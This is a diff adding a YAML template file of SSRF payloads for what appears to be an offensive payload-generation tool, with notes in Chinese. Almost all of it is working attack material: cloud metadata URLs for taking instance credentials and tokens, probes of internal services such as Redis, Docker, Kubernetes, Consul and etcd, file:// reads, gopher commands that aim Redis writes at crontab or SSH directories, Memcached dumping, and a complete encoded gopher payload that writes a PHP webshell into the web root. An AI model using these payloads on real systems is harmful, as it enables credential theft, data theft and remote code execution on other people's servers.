@@ -1,0 +1,305 @@
+ruleDB: v0.1.0
+# SSRF 模板。content_type 用 url——这是本方案里第一个「载荷就是个 URL」的类型。
+#
+# IP 的几种等价写法（十进制 / 十六进制 / 八进制 / IPv6）走的是 `replace` 绕过，
+# 见 data/bypasses.yaml 的 bypass.ip.*。**没有再新增绕过类型**——
+# 它们是字符串替换，正好落在闭类型集里，这是对 §6.2 那次收敛的又一次验证。
+
+templates:
+  - id: ssrf.generic.cloud.metadata
+    name: SSRF 云元数据
+    desc: 各云厂商的元数据地址，拿到临时凭证就是接管。
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      # 好几家的元数据都挂在 169.254.169.254 上，靠**路径**区分，不是靠地址。
+      #
+      # 有的端点还要求带特定请求头，而本工具的载荷只是那个 URL——
+      # 头带不进去，所以**写在选项名里**，用的时候自己补。
+      # 工具能输出的 curl / 原始报文里加一行 -H 就行。
+      #
+      # 没做进来的一条：**AWS IMDSv2**。它要求先 `PUT /latest/api/token` 拿一个
+      # token、再带着 `X-aws-ec2-metadata-token` 去请求——两步，表达不了。
+      # 目标开了 IMDSv2（新账号默认）时，上面那几条 AWS 的都会回 401。
+      target:
+        options:
+          - {id: aws,      name: "AWS / 通用",           url: "http://169.254.169.254/latest/meta-data/"}
+          - {id: aws_iam,  name: "AWS IAM 凭证",         url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+          - {id: aws_userdata, name: "AWS 实例 user-data（启动脚本，常含密钥）",
+           url: "http://169.254.169.254/latest/user-data"}
+          - {id: aws_identity, name: "AWS 实例身份文档（账号 / 区域 / 实例 ID）",
+           url: "http://169.254.169.254/latest/dynamic/instance-identity/document"}
+          - {id: aws_ecs,  name: "AWS ECS 任务元数据",   url: "http://169.254.170.2/v2/metadata"}
+          - {id: gcp,      name: "GCP（要带 Metadata-Flavor: Google）",
+           url: "http://metadata.google.internal/computeMetadata/v1/"}
+          - {id: azure,    name: "Azure IMDS（要带 Metadata: true）",
+           url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
+          - {id: azure_msi, name: "Azure 托管标识令牌（要带 Metadata: true）",
+           url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
+          - {id: oracle,   name: "Oracle Cloud（要带 Authorization: Bearer Oracle）",
+           url: "http://169.254.169.254/opc/v2/instance/"}
+          - {id: aliyun,   name: "阿里云",               url: "http://100.100.100.200/latest/meta-data/"}
+          - {id: tencent,  name: "腾讯云",               url: "http://metadata.tencentyun.com/latest/meta-data/"}
+          - {id: huawei,   name: "华为云",               url: "http://169.254.169.254/openstack/latest/meta_data.json"}
+          - {id: volc,     name: "火山引擎",             url: "http://100.96.0.96/latest/meta-data/"}
+          - {id: digitalocean, name: "DigitalOcean",     url: "http://169.254.169.254/metadata/v1/"}
+          - {id: scaleway, name: "Scaleway（地址不是 169.254.169.254）", url: "http://169.254.42.42/conf?format=json"}
+          - {id: linode,   name: "Linode",               url: "http://169.254.169.254/v1/instance"}
+        # OpenStack 的 config-drive 路径和华为云那条完全一样
+        # （169.254.169.254/openstack/latest/meta_data.json），不重复列一档。
+        default: aws
+    body: "<<target.url>>"
+    vars: []
+    requires: [cloud, fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssrf.generic.internal.localhost
+    name: SSRF 打本机端口
+    desc: 打目标自己身上的服务时用，127.0.0.1 常能绕过只拦外部地址的校验。端口槽位是几个常见的，打别的内网主机得换 network 那条
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      port: {options: ["80", "443", "6379", "3306", "8080", "9200", "11211", "27017"], default: "6379"}
+    body: "http://127.0.0.1:<<port>>/"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.internal.network
+    name: SSRF 打内网网段
+    desc: 打内网里的其他主机时用。rhost / rport 没有默认值，地址和端口得先侦察出来；只打目标本机的话用 localhost 那条，端口有候选
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "http://<<rhost>>:<<rport>>/"
+    vars: [rhost, rport]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.scheme.file
+    name: SSRF file 协议读文件
+    desc: 应用没限制协议时，file:// 直接读本地文件
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "file://<<filepath>>"
+    vars: [filepath]
+    requires: [proto-open]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssrf.generic.scheme.gopher
+    name: SSRF gopher 打 Redis
+    desc: gopher 能构造任意 TCP 字节流，配合 Redis 未授权可直接写文件或写计划任务
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      port: {options: ["6379", "6380"], default: "6379"}
+    body: "gopher://127.0.0.1:<<port>>/_<<payload>>"
+    vars: [payload]
+    requires: [proto-open]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssrf.generic.scheme.dict
+    name: SSRF dict 协议探测
+    desc: dict 协议能拿到服务横幅，适合快速判断端口后面是什么
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "dict://127.0.0.1:<<port>>/info"
+    vars: []
+    slots:
+      port: {options: ["6379", "11211", "3306"], default: "6379"}
+    requires: [proto-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssrf.generic.redirect.open
+    name: SSRF 经跳转绕过
+    desc: 应用只校验首个 URL 的域名时，用自己的服务器做 302 跳到内网
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    body: "http://<<lhost>>/r?to=http://169.254.169.254/latest/meta-data/"
+    vars: [lhost]
+    requires: [outbound, listener, redirect-follow]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssrf.generic.scheme.gopher.redis
+    name: SSRF gopher 打 Redis
+    desc: 用 Redis 的**内联命令**（不写 RESP 的星号帧，直接一条命令加 CRLF），比手算 RESP 长度可靠得多。分步走：先 flushall 确认能通，再定落点目录与文件名，最后 save 落盘
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      port: {options: ["6379", "6380"], default: "6379"}
+      cmd:
+        options:
+          - {id: flushall, name: "flushall（清库，先确认能通）", raw: "flushall"}
+          - {id: info,     name: "info（读服务器信息）",         raw: "info"}
+          - {id: dir_cron, name: "落点指向 crontab 目录",        raw: "config%20set%20dir%20/var/spool/cron/"}
+          - {id: dir_ssh,  name: "落点指向 SSH 目录",            raw: "config%20set%20dir%20/root/.ssh/"}
+          - {id: filename, name: "定文件名（crontab 用 root）",  raw: "config%20set%20dbfilename%20root"}
+          - {id: save,     name: "save（落盘）",                 raw: "save"}
+        default: flushall
+    body: "gopher://127.0.0.1:<<port>>/_<<cmd.raw>>%0D%0A"
+    vars: []
+    requires: [proto-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.dns.rebind
+    name: SSRF DNS 重绑定
+    desc: 应用「先解析域名校验、再发请求」时，让同一个域名前后解析到不同地址：第一次回公网 IP 过校验，第二次回内网 IP 打进去。需要一个把 TTL 调到 0 的自建 DNS
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      scheme: {options: ["http", "https"], default: "http"}
+      port:   {options: ["80", "443", "8080"], default: "80"}
+    body: "<<scheme>>://<<sub>>.<<domain>>:<<port>>/"
+    vars: [sub, domain]
+    requires: [outbound, listener, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.scheme.misc
+    name: SSRF 冷门协议族
+    desc: 应用没做协议白名单时，协议族里每多一个就多一条路。**这些协议各自绑死底层实现**，选之前先确认目标是什么栈：`ldap://` 是 Java JNDI 的经典入口（也是打内网 LDAP 的入口），`jar://` 和 `netdoc://` 是 **Java 的 URL 专有处理器**（`netdoc://` 等价于读文件），`tftp://` 走 UDP 69、只有 Java/curl 编译带 TFTP 时才有，`sftp://` 要 curl 带 libssh2。Python 的 urllib 只认 http/https/ftp/file/data，把这些喂给它只会得到 unknown url type
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      target:
+        options:
+          - {id: ldap,   name: "ldap://（Java JNDI / 目录服务）",      url: "ldap://<<rhost>>:<<rport>>/"}
+          - {id: ldaps,  name: "ldaps://",                             url: "ldaps://<<rhost>>:<<rport>>/"}
+          - {id: tftp,   name: "tftp://（UDP 69）",                    url: "tftp://<<rhost>>:<<rport>>/"}
+          - {id: sftp,   name: "sftp://（要 libssh2）",                url: "sftp://<<rhost>>:<<rport>>/"}
+          - {id: netdoc, name: "netdoc://（Java 专有，等价于读文件）",  url: "netdoc://<<filepath>>"}
+          - {id: jar,    name: "jar://（Java 专有，先拉再解）",         url: "jar:http://<<rhost>>:<<rport>>/<<file>>!/"}
+        default: ldap
+    body: "<<target.url>>"
+    vars: [rhost, rport, filepath, file]
+    requires: [proto-open, fetch-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.internal.services
+    name: SSRF 打内网服务（HTTP 类）
+    desc: 内网服务大多没有认证，只要能把请求打过去就等于拿到数据。这条收的都是**裸 HTTP 就能打**的目标；要构造 Redis 那种非 HTTP 协议的字节流，用 `ssrf.generic.scheme.gopher.redis` 那几条。**Kubernetes API 那条多数要 token**（打在 6443 上的匿名请求会回 401，能回 401 本身就说明端口通、值得继续找凭证）；kubelet 的 10255 只读端口在新版里默认已关闭。etcd 的 v2 API 在 3.4 之后默认关，v3 是 gRPC，HTTP 打不到
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      target:
+        options:
+          - {id: es,         name: "Elasticsearch · 列索引",              url: "http://<<rhost>>:9200/_cat/indices?v"}
+          - {id: es_dump,    name: "Elasticsearch · 无认证直接搜前 100 条", url: "http://<<rhost>>:9200/_search?size=100"}
+          - {id: docker,     name: "Docker API · 列容器",                 url: "http://<<rhost>>:2375/containers/json"}
+          - {id: docker_ver, name: "Docker API · 版本（确认未授权）",      url: "http://<<rhost>>:2375/version"}
+          - {id: registry,   name: "Docker Registry v2 · 列仓库",          url: "http://<<rhost>>:5000/v2/_catalog"}
+          - {id: k8s,        name: "Kubernetes API · 列 Pod",             url: "https://<<rhost>>:6443/api/v1/pods"}
+          - {id: kubelet,    name: "kubelet 只读端口 · 列 Pod",            url: "http://<<rhost>>:10255/pods"}
+          - {id: consul,     name: "Consul · 递归读 KV",                  url: "http://<<rhost>>:8500/v1/kv/?recurse"}
+          - {id: etcd,       name: "etcd v2 · 递归列 key",                url: "http://<<rhost>>:2379/v2/keys/?recursive=true"}
+        default: es
+    body: "<<target.url>>"
+    vars: [rhost]
+    requires: [fetch-sink, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.gopher.memcached
+    name: SSRF gopher 打 Memcached
+    desc: Memcached 说的是纯文本协议（一行一条命令、CRLF 结尾），所以用 gopher 的内联写法就能直接对话，不用手算 RESP 那种长度帧。**分步走**：先 `stats` 确认能通，再 `stats items` 看 slab，然后用 `stats cachedump` 把 key 列出来（默认只能 dump 1MB 以下的 slab，且不同版本参数不一样），最后按 key 逐个 `get`。Memcached 里存的常是 session、序列化的用户对象这类值
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      port: {options: ["11211"], default: "11211"}
+      cmd:
+        options:
+          - {id: stats,       name: "stats（先确认能通）",              raw: "stats"}
+          - {id: stats_items, name: "stats items（列 slab）",           raw: "stats%20items"}
+          - {id: dump_1,      name: "stats cachedump 1 100（列 key）",  raw: "stats%20cachedump%201%20100"}
+          - {id: get,         name: "get <key>（读某个 key 的值）",      raw: "get%20%22<<key>>%22"}
+        default: stats
+    body: "gopher://127.0.0.1:<<port>>/_<<cmd.raw>>%0D%0A"
+    vars: [key]
+    requires: [proto-open, fetch-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssrf.generic.gopher.redis.webshell
+    name: SSRF gopher 经 Redis 写 WebShell
+    desc: Redis 未授权 + 进程对 Web 根有写权限时用。原理是 `save` 会把整个库 dump 成 RDB 落到 `dir`/`dbfilename` 指定的路径——把 `set` 的值写成一句 PHP，落点指到 Web 根，就得到一个 webshell（文件开头混着 RDB 的二进制头，不影响后面 `<?php` 那段的执行）。**和写 crontab 那条的取舍**：crontab 只要求 /var/spool/cron 可写、且要等一分钟；这条要求 Web 根可写、但立刻能访问。访问 `http://target/shell.php?1=id` 验证。想更稳就先发 `ssrf.generic.scheme.gopher.redis` 的 flushall 确认能通
+    vuln: [ssrf]
+    content_type: [url]
+    component: []
+    version: "*"
+    slots:
+      port: {options: ["6379", "6380"], default: "6379"}
+      webroot:
+        options:
+          - {id: apache, name: "Apache · /var/www/html",          path: "/var/www/html"}
+          - {id: nginx,  name: "Nginx · /usr/share/nginx/html",   path: "/usr/share/nginx/html"}
+          - {id: tomcat, name: "Tomcat · webapps/ROOT",           path: "/usr/local/tomcat/webapps/ROOT"}
+        default: apache
+      ext:
+        options:
+          - {id: php,   name: "shell.php（PHP 目标）",   f: ".php"}
+          - {id: phtml, name: "shell.phtml（PHP 目标）", f: ".phtml"}
+        default: php
+    body: |-
+      gopher://127.0.0.1:<<port>>/_config%20set%20dir%20<<webroot.path>>%0D%0Aconfig%20set%20dbfilename%20shell<<ext.f>>%0D%0Aset%20x%20%22%3C%3Fphp%20system(%24_GET%5B1%5D)%3B%3F%3E%22%0D%0Asave%0D%0A
+    vars: []
+    requires: [proto-open, fetch-sink, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
